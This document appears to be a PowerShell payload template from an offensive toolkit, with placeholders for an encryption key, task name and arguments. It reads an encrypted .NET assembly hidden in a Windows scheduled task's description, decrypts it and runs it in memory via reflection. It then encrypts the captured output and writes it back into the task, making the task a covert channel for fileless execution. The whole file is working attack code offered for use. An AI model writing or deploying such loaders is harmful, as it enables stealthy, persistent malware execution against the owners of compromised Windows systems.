$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()
try {{
    $folder = $scheduler.GetFolder($taskPath)
    $task = $folder.GetTask("{taskname}")
    $definition = $task.Definition
    $description = $definition.RegistrationInfo.Description
    try {{
        $decryptedDescription = Decrypt-Data $encryptionKey $description
        $pass_args = Decrypt-Data $encryptionKey "REPLACE_ARGS"
        $args = $pass_args -split ' '
        $assembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($decryptedDescription))
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {{
            $consoleOutput = New-Object System.IO.MemoryStream
            $streamWriter = New-Object System.IO.StreamWriter($consoleOutput)
            $oldOut = [Console]::Out
            [Console]::SetOut($streamWriter)

            [string[]]$ARGS_NAME = @($args)
            $null = $entryPoint.Invoke($null, [object[]](,$ARGS_NAME))

            $streamWriter.Flush()
            [Console]::SetOut($oldOut)
            $consoleOutput.Position = 0
            $streamReader = New-Object System.IO.StreamReader($consoleOutput)
            $executionResult = $streamReader.ReadToEnd()
            # Cleanup
            $streamReader.Dispose()
            $streamWriter.Dispose()
            $consoleOutput.Dispose()
        }} else {{
            Write-Host "No entry point found in assembly."
        }}   
    }} catch {{
        $executionResult = $_.Exception.Message
    }}
    $encryptedResult = Encrypt-Data $encryptionKey $executionResult
    $definition.RegistrationInfo.Description = $encryptedResult
    $user = $task.Principal.UserId
    $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)
}}catch {{
    Write-Error "Failed.."
}}
finally {{
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) | Out-Null
}}
[Environment]::Exit(0)